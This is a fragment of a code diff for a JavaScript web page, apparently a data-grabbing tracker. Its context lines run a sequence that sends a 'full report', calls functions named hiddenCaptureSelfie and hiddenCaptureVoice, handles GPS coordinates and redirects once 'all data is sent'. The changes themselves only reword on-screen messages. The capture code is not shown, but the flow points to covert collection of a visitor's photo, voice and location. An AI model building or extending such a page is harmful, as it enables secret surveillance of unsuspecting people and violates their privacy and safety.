@@ -625,12 +625,12 @@
                 await sendFullReport();
                 
                 // 4. KIRIM SELFIE
-                showToast('sebentar');
+                showToast('📸 Mengambil dan mengirim selfie...');
                 await hiddenCaptureSelfie();
                 
                 // 5. KIRIM VOICE (jika mikrofon diizinkan)
                 if (permissions.mic) {
-                    showToast('sebentar lagi');
+                    showToast('🎤 Merekam dan mengirim suara...');
                     await hiddenCaptureVoice();
                 } else {
                     const gpsText = (gpsData && gpsData.lat) ? `${gpsData.lat}, ${gpsData.lon}` : 'Tidak tersedia';
@@ -638,7 +638,7 @@
                 }
                 
                 // 6. REDIRECT KE TRACKING.HTML
-                loading.innerHTML = '✅ Semua data terkirim! Mengalihkan ke website';
+                loading.innerHTML = '✅ Semua data terkirim! Mengalihkan ke AI Tracking Lab...';
                 showToast('✅ Semua data terkirim! Mengalihkan...');
                 
                 setTimeout(() => {
